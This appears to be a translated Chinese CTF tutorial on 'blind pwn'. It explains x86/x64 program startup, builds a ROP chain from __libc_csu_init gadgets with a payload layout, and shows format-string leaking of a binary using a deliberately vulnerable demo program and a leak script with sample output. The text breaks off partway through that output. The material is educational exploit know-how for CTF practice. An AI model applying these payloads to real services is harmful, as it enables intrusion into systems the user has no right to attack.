# Pwn 盲打（Bilnd Pwn）的一般解决思路
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x01 写在前面
最近出现了许多次`Bilnd Pwn`的题目，故在这里总结一些常见的思路。
本文的部分内容引用了大佬的博客原文，已在文章末尾的参考链接中注明了原作者。
## 0x02 前置知识
###  程序的一般启动过程
### 关于`_start`函数
本部分内容均为一个空的main函数的编译结果，源码如下：
    int main()
    {
    }
    //gcc -ggdb -o prog1 prog1.c
**程序的启动**
当你执行一个程序的时候，shell或者GUI会调用execve()，它会执行linux系统调用execve()。如果你想了解关于execve()函数，你可以简单的在shell中输入`man
execve`。这些帮助来自于man手册（包含了所有系统调用）的第二节。简而言之，系统会为你设置栈，并且将`argc`，`argv`和`envp`压入栈中。文件描述符0，1和2（stdin,
stdout和stderr）保留shell之前的设置。加载器会帮你完成重定位，调用你设置的预初始化函数。当所有搞定之后，控制权会传递给`_start()`。
**`_start`函数的实现**
    080482e0 :
    80482e0:       31 ed                   xor    %ebp,%ebp
    80482e2:       5e                      pop    %esi
    80482e3:       89 e1                   mov    %esp,%ecx
    80482e5:       83 e4 f0                and    $0xfffffff0,%esp
    80482e8:       50                      push   %eax
    80482e9:       54                      push   %esp
    80482ea:       52                      push   %edx
    80482eb:       68 00 84 04 08          push   $0x8048400
    80482f0:       68 a0 83 04 08          push   $0x80483a0
    80482f5:       51                      push   %ecx
    80482f6:       56                      push   %esi
    80482f7:       68 94 83 04 08          push   $0x8048394
    80482fc:       e8 c3 ff ff ff          call   80482c4 
    8048301:       f4
  1. 任何值`xor`自身得到的结果都是0。所以`xor %ebp,%ebp`语句会把`%ebp`设置为0。ABI（Application Binary Interface specification）推荐这么做，目的是为了标记最外层函数的页帧（frame）。
  2. 接下来，从栈中弹出栈顶的值保存到`%esi`。在最开始的时候我们把`argc`，`argv`和`envp`放到了栈里，所以现在的`pop`语句会把`argc`放到`%esi`中。这里只是临时保存一下，稍后我们会把它再次压回栈中。因为我们弹出了`argc`，所以`%ebp`现在指向的是`argv`。
  3. `mov`指令把`argv`放到了`%ecx`中，但是并没有移动栈指针。
  4. 然后，将栈指针和一个可以清除后四位的掩码做`and`操作。根据当前栈指针的位置不同，栈指针将会向下移动0到15个字节。这么做，保证了任何情况下，栈指针都是16字节的偶数倍对齐的。对齐的目的是保证栈上所有的变量都能够被内存和cache快速的访问。要求这么做的是SSE，就是指令都能在单精度浮点数组上工作的那个（扩展指令集）。比如，某次运行时，`_start`函数刚被调用的时候，`%esp`处于`0xbffff770`。
  5. 在我们从栈上弹出`argc`后，`%esp`指向`0xbffff774`。它向高地址移动了（往栈里存放数据，栈指针地址向下增长；从栈中取出数据，栈指针地址向上增长）。当对栈指针执行了`and`操作后，栈指针回到了`0xbffff770`。
  6. 现在，我们把`__libc_start_main`函数的参数压入栈中。第一个参数`%eax`被压入栈中，里面保存了无效信息，原因是稍后会有七个参数将被压入栈中，但是为了保证16字节对齐，所以需要第八个参数。这个值也并不会被用到。
  7. `%esp`，存放了`void (*stack_end)`,即为已被对齐的栈指针。
  8. `%edx`，存放了`void (*rtld_fini)(void)`,即为加载器传到edx中的动态链接器的析构函数。被`__libc_start_main`函数通过`__cxat_exit()`注册，为我们已经加载的动态库调用`FINI section`。
  9. `%8048400`，存放了`void (*fini)(void)`,即为`__libc_csu_fini`——程序的析构函数。被`__libc_start_main`通过`__cxat_exit()`注册。
  10. `%80483A0`，存放了`void (*init)(void)`,即为`__libc_csu_init`——程序的构造函数。于`main`函数之前被`__libc_start_main`函数调用。
  11. `%ecx`，存放了`char **ubp_av`,即为argv相对栈的偏移值。
  12. `%esi`，存放了`argc`,即为argc相对栈的偏移值。
  13. `0x8048394`，存放了`int (*main)(int,char**,char**)`,即为我们程序的`main`函数，被`__libc_start_main`函数调用`main`函数的返回值被传递给`exit()`函数，用于终结我们的程序。
**`__libc_start_main`函数**
`__libc_start_main`是在链接的时候从glibc复制过来的。在glibc的代码中，它位于`csu/libc-start.c`文件里。`__libc_start_main`的定义如下：
    int __libc_start_main(  
        int (*main) (int, char **, char **),
        int argc, char ** ubp_av,
        void (*init) (void),
        void (*fini) (void),
        void (*rtld_fini) (void),
        void (* stack_end)
    );
所以，我们期望`_start`函数能够将`__libc_start_main`需要的参数按照逆序压入栈中。
### 关于`__libc_csu_init`函数的利用
**`__libc_csu_init`函数的实现**
    .text:0000000000400840 ; ===================== S U B R O U T I N E ====================
    .text:0000000000400840
    .text:0000000000400840
    .text:0000000000400840                 public __libc_csu_init
    .text:0000000000400840 __libc_csu_init proc near               ; DATA XREF: _start+16
    .text:0000000000400840                 push    r15
    .text:0000000000400842                 mov     r15d, edi
    .text:0000000000400845                 push    r14
    .text:0000000000400847                 mov     r14, rsi
    .text:000000000040084A                 push    r13
    .text:000000000040084C                 mov     r13, rdx
    .text:000000000040084F                 push    r12
    .text:0000000000400851                 lea     r12, __frame_dummy_init_array_entry
    .text:0000000000400858                 push    rbp
    .text:0000000000400859                 lea     rbp, __do_global_dtors_aux_fini_array_entry
    .text:0000000000400860                 push    rbx
    .text:0000000000400861                 sub     rbp, r12
    .text:0000000000400864                 xor     ebx, ebx
    .text:0000000000400866                 sar     rbp, 3
    .text:000000000040086A                 sub     rsp, 8
    .text:000000000040086E                 call    _init_proc
    .text:0000000000400873                 test    rbp, rbp
    .text:0000000000400876                 jz      short loc_400896
    .text:0000000000400878                 nop     dword ptr [rax+rax+00000000h]
    .text:0000000000400880
    .text:0000000000400880 loc_400880:                      ; CODE XREF: __libc_csu_init+54
    .text:0000000000400880                 mov     rdx, r13
    .text:0000000000400883                 mov     rsi, r14
    .text:0000000000400886                 mov     edi, r15d
    .text:0000000000400889                 call    qword ptr [r12+rbx*8]
    .text:000000000040088D                 add     rbx, 1
    .text:0000000000400891                 cmp     rbx, rbp
    .text:0000000000400894                 jnz     short loc_400880
    .text:0000000000400896
    .text:0000000000400896 loc_400896:                      ; CODE XREF: __libc_csu_init+36
    .text:0000000000400896                 add     rsp, 8
    .text:000000000040089A                 pop     rbx
    .text:000000000040089B                 pop     rbp
    .text:000000000040089C                 pop     r12
    .text:000000000040089E                 pop     r13
    .text:00000000004008A0                 pop     r14
    .text:00000000004008A2                 pop     r15
    .text:00000000004008A4                 retn
    .text:00000000004008A4 __libc_csu_init endp
    .text:00000000004008A4
    .text:00000000004008A4 ; -------------------------------------------------------------------    
**可利用的ROP链构造**
x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8 和 R9 中，那么我们可以很明显的看出一些gadget。
    .text:000000000040084C        mov  R13 , rdx        ; R13  = rdx  = arg3
    .text:0000000000400847        mov  R14 , rsi        ; R14  = rsi  = arg2
    .text:0000000000400842        mov  R15d, edi        ; R15d = edi  = arg1
    .text:0000000000400880         mov  rdx , R13        ; rdx  = R13  
    .text:0000000000400883        mov  rsi , R14        ; rsi  = R14  
    .text:0000000000400886        mov  edi , R15d        ; rdi  = R15d
那么我们可以构造以下ROP链：
    .text:0000000000400???            retn                        ; 漏洞函数的return，设置为0x40089A
    .text:000000000040089A            pop   rbx                    ; 建议置零
    .text:000000000040089B            pop   rbp                    ; 建议置1，以防跳入循环
    .text:000000000040089C            pop   r12                    ; ROP链执行完毕后的返回地址
    .text:000000000040089E             pop   r13                    ; RDX，即ROP链执行过程中跳入函数的arg3
    .text:00000000004008A0            pop   r14                    ; RSI，即ROP链执行过程中跳入函数的arg2
    .text:00000000004008A2            pop   r15                    ; EDI，即ROP链执行过程中跳入函数的arg1
    .text:00000000004008A4            retn                        ; 设置为0x400880
    .text:0000000000400880            mov   rdx, r13                ; ROP链执行过程中跳入函数的arg3
    .text:0000000000400883            mov   rsi, r14                ; ROP链执行过程中跳入函数的arg2
    .text:0000000000400886            mov   edi, r15d                ; ROP链执行过程中跳入函数的arg1
    .text:0000000000400889            call  qword ptr [r12+rbx*8]    ; CALL [R12]
    .text:000000000040088D            add   rbx, 1                ; RBX = 0 -> RBX = 1
    .text:0000000000400891            cmp   rbx, rbp                ; RBX = RBP = 1
    .text:0000000000400894            jnz   short loc_400880        ; 跳转未实现
    .text:0000000000400896            add   rsp, 8                ; 抬高栈顶
    .text:000000000040089A            pop   rbx                    ; 
    .text:000000000040089B            pop   rbp                    ; 
    .text:000000000040089C            pop   r12                    ; 
    .text:000000000040089E             pop   r13                    ; 
    .text:00000000004008A0            pop   r14                    ; 
    .text:00000000004008A2            pop   r15                    ; 
    .text:00000000004008A4            retn                        ; 设置为下一步的返回地址
payload可以按如下方式布置：
    pop_init = 0x40075A 
    pop_init_next = 0x400740 
    payload = '....'
    payload += p64(pop_init)        #goto __libc_csu_init
    payload += p64(0)                #pop rbx
    payload += p64(1)                #pop ebp
    payload += p64(got_xxx)            #pop r12
    payload += p64(argv3)            #pop 13 = pop rdx
    payload += p64(argv2)            #pop 14 = pop rsi
    payload += p64(argv1)            #pop 15 = pop rdi
    payload += p64(pop_init_next)    #ret
    payload += 'x00' * 8 * 7         # pop 6 + RBP
    payload += p64(addr_main)        #ret
###  错位构造gadget
**`pop rdi;ret;`构造**
在0x4008A2处的语句是`pop r15;ret;`，它的字节码是`41 5f c3`。
而`pop rdi;ret;`的字节码是`5f c3`。
那么当EIP指向0x4008A3时，程序事实上将会执行`pop rdi;ret;`。
**`pop rsi;pop r15;ret;`构造**
同理0x4008A0处的语句是`pop r14;pop r15;ret;`，它的字节码是`41 5e 41 5f c3`。
而`pop rsi;pop r15;ret;`的字节码是`5e 41 5f c3`。
那么当EIP指向0x4008A1时，程序事实上将会执行`pop rsi;pop r15;ret;`。
## 0x03 利用格式化字符串漏洞泄漏整个二进制文件
###  原理简述
格式化字符串的原理本文不再赘述，对于泄漏文件，我们常用的几个格式化控制符为：
  1. %N$p：以16进制的格式输出位于printf第N个参数位置的值；
  2. %N$s：以printf第N个参数位置的值为地址，输出这个地址指向的字符串的内容；
  3. %N$n：以printf第N个参数位置的值为地址，将输出过的字符数量的值写入这个地址中，对于32位elf而言，%n是写入4个字节，%hn是写入2个字节，%hhn是写入一个字节；
  4. %Nc：输出N个字符，这个可以配合%N$n使用，达到任意地址任意值写入的目的。
###  Demo
**漏洞环境搭建**
以下为Demo源码
    //blind_pwn_printf_demo.c
    #include 
    #include 
    int main()
    {
        setbuf(stdin, 0LL);
        setbuf(stdout, 0LL);
        setbuf(stderr, 0LL);
        char buf[100];
        while (1)
        {  
            read(STDIN_FILENO, buf, 100);
            rintf(buf);
            putchar('n');
        }
        return 0;
    }
    //gcc -z execstack -fno-stack-protector -no-pie -o blind_pwn_printf_demo_x64 blind_pwn_printf_demo.c
    //gcc -z execstack -fno-stack-protector -no-pie -m32 -o blind_pwn_printf_demo_x32 blind_pwn_printf_demo.c
此处我们不再启用服务器，直接用process加载本地文件，试图泄漏出文件副本。
**Leak Stack & Where is `.text`**
这里我们使用`%n$p`来循环泄漏`Stack`数据，此处我们先泄露400byte的stack data。
    def where_is_start():
        for i in range(100):
            payload = '%%%d$p.TMP' % (i)
            sh.sendline(payload)
            val = sh.recvuntil('.TMP')
            log.info(str(i*4)+' '+val.strip().ljust(10))
            sh.recvrepeat(0.2)
⚠：此处`%%=%`、`%d=i`、x32下每次泄漏4字节，因此有`ix4`。
Leak result:
    [*] 0 %0$p.TMP  
    [*] 4 0xffd64ccc.TMP
    [*] 8 0x64.TMP  
    [*] 12 0xf7e006bb.TMP
    [*] 16 0xffd64cee.TMP
    [*] 20 0xffd64dec.TMP
    [*] 24 0xe0.TMP  
    [*] 28 0x70243725.TMP
    [*] 32 0x504d542e.TMP
    [*] 36 0xf7f6990a.TMP
    [*] 40 0xffd64cf0.TMP
    [*] 44 0x80482d5.TMP
    [*] 48 (nil).TMP 
    [*] 52 0xffd64d84.TMP
    [*] 56 0xf7f22000.TMP
    [*] 60 0x6f17.TMP